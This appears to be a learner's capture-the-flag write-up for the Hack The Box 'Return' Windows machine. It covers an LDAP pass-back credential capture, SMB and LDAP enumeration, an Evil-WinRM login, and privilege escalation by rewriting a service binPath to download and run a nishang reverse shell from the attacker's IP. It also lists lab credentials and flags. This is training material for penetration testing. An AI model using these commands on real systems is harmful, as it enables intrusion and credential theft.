# Enumeration
## nmap
doing a thorough nmap scan `nmap -p- -sV -A -v 10.10.11.108` showed the following, where netbios is most likely an smb service. --> looking at the scan smb2 is up
![[Screenshot 2022-04-21 at 12.44.10.png]]
Looks like its kerberos and active directory..
[I wanted to try an active box on this but had no idea how to approach it maybe this will help]

A UDP scan `sudo nmap -sU 10.10.11.108 --min-rate 5000` showed ntp and ldap too.

## searchsploit
Looking up _smb2 3.1.1_ theres an immediate remote execution exlpoit which shows
`searchsploit smb 3.1.1 `:
![[Screenshot 2022-04-21 at 12.53.00.png]]


# Foothold
## http
_HTB printer admin panel_ is the homepage you get to when visitting the page.
`<path fill-rule="evenodd" clip-rule="evenodd" d="M0 2V0H18V2H0ZM0 7H18V5H0V7ZM0 12H18V10H0V12Z" fill="white"/>` this part of the code looked odd to me. Is it a hash of sorts?(not base 64).

On the settings page it looks like some code is being executed directly into the HTTP POST form `printer.return.local`. Looking this up I came accross [this article](https://medium.com/r3d-buck3t/pwning-printers-with-ldap-pass-back-attack-a0d8fa495210) which seems to explain how LDAP can be used to capture credentials.
*HOWEVER*, it appears they are using this machine as an example, which is not what I wanted..

There is a saved username and password - _svc-printer:*******_ - which should give us a username?

Trying to replace the `printer.return.local` with my own ip and setting up the listener worked! we got some credentials _svc-printer:1edFg43012!!_. Can we use this for smbclient?
![[Screenshot 2022-04-21 at 13.13.03.png]]

### defult credentials
I cam accross an article (under new things learnt) that said commonly used admin credentials were __
## smb
### smbclient
Trying `smbclient -L return` and `smbclient -L svc-printer` did not work. Neither did `smbclient \\\\return\\svc-printer 1edFg43012!!`, as the terminal only took the _!!_ to mean the previous command. Annoying.. --> this can be escaped with the `\`.
`smbclient \\\\return\\svc-printer 1edFg43012\!\!` did not connect however..
### smbmap
after looking around for a bit, I found smbmap, which would potentially help with further smb enumeration.
`smbmap -u svc-printer -p 1edFg43012\!\! -H 10.10.11.108` gave the results:
![[Screenshot 2022-04-21 at 13.31.00.png]]

## further enum - LDAP
For further LDAP enumeration (as the smb connections did not work) I proceeded to try some of the enumerations from [this](https://book.hacktricks.xyz/pentesting/pentesting-ldap) article.
`nmap -n -sV --script "ldap* and not brute" 10.10.11.108` yielded the following helpful results:
_rootDomainNamingContext: DC=return,DC=local_, _ldapServiceName: return.local:printer$@RETURN.LOCAL_, _serverName: CN=PRINTER_. 

--> **With the domain being _return.local_ I edited _/etc/hosts_ to return.local!**

Further, I also downloaded _pip3_ and _ldapdomaindump_:
`ldapdomaindump 10.10.11.108 -u printer.return.local\\svc-printer -p 1edFg43012\!\! --no-json --no-grep` returned a bunch of files. 

_domain_users.html_ had the users of the domain. 
![[Screenshot 2022-04-21 at 15.24.07.png]]

## smbget
Connecting to smbclient using `smbclient \\\\return.local\\svc-printer 1edFg43012\!\!` showed _anonymous login successful_ but said _tree connect failed: NT_STATUS_BAD_NETWORK_NAME_. I therefore tried smbget to maybe get the files?

## SMBCLIENT 2
Trying with the found domains (IPC$, SYSVOL, etc):
![[Screenshot 2022-04-21 at 15.41.08.png]]
As can be seen, IPC$ did not have any results. However C$ did:
![[Screenshot 2022-04-21 at 15.44.44.png]]

I directed to _\\return.local\C$\Users\svc-printer\Desktop\__ and used `mgetuser.txt`. Then read th contents and got the user flag.

# Exploit
Now I had no idea how to go on about this, so I cheated and had some help from a writeup..

Enter, `crackmapexec`. This can be used to check if we had smb access with the current user and pasword (which we already knew we had), butalso to see if we have remote acces:
`crackmapexec winrm 10.10.11.108 -u svc-printer -p 1edFg43012\!\!` and it looks like we do.
Apparently, this means we essentially have pwned the system.. --> and the "go-to" exploit for this (from several of the writeups) was _Evil-WinRM_.

I downloaded the one from github, but apparently there's another downloadable one.
Used `sudo gem install evil-winrm` before `evil-winrm -i 10.10.11.108 -u svc-printer -p 1edFg43012\!\!` and got a shell. 
`
# Privesc
From here, I assumed gathering as much info and details as possible about the system beofre finding a vulnerability. My only issue is I am not used to doing Windows machines and was not sure what to look for or how.
However, I tried getting the winpeas and maybe executing this?
## enumeration
`net user svc-printer` - shows that the user is part of the _Server Operators_ group. Looking in the files we found previously it says that members of this group can 'administer domain servers' - which we should be able to use to exscalate our privileges through changing the credentials of another user with better privileges (i.e.). There's more info about the AD group [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators).

To 'download' the winpeas script I used `Invoke-WebRequest -Uri "http://10.10.14.14:8000/winPEASx64.exe" -OutFile "C:\Users\svc-printer\Downloads\winenum.exe"` and then executed it `./winenum.exe`.

Findings:
AppCmd.exe - which can only be ran by administrators
`C:\Users\svc-printer : svc-printer [AllAccess]`

### Other useful enum commands
`whoami`
`whoami /groups`
`net users`
`net groups`


## research
Looking into the _Server Operators_ and what being part of this group mens for Windows active directory I found [this article](https://www.secframe.com/blog/2019/account-operators-attacked/) which showed a couple ways it could be used to exploit the 'privileges'.

Following [this article](https://cube0x0.github.io/Pocing-Beyond-DA/):
1. I 'downloaded' the [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1#L101) shell and saved it in tools.
	1. Added `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 4444` to the end of the file
2. Set up a nc listener
3. And a python web server in the tools directory
4. Then executed the line of commands `sc.exe config vss binPath="C:\Windows\System32\cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.14:8000/nishang_shell.ps1')"` before stopping the service with `sc.exe stop VSS` which returned an error. But proceeded to restart the service anyways `sc.exe start VSS` which caused the shell to return an ERROR and hang, but going to the nc listener we now had a shell as _NT authority/system_, aka administrative privileges.

_From here I just went to C:\USers\Administratorand got the root flag _



![[Screenshot 2022-04-23 at 15.58.04.png]]

### sc.exe explained
[It](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) is basically just creating subkeys and entries for existing services, which can be used with path poisoning. By changing the path to a malicious service, a reverse shell or similar can be achieved.

# Flags
18a89177491bce507833c7796346d22d
d2451b245b364373c08edf065a6296fc
# Thoughts
- replace `printer.return.local` with own ip address and set up nc listener --> **YES**
- winPeas?
- Path poisoning **YES**

I am not very familiar with Windows and especially not AD, but I havebeen maening to get better at it, so I will try to do some more. The PS commands confuse me as they seem more complex than those of Linux. Overall a quite interesting box though.

# New Things Learnt
- LDAP pass-back attack (https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)
- crackmapexec 
- ldapdomaindump
- evil-winrm
- bloodhound ?


_[writeup used](https://readysetexploit.wordpress.com/2021/10/12/hack-the-box-return/)_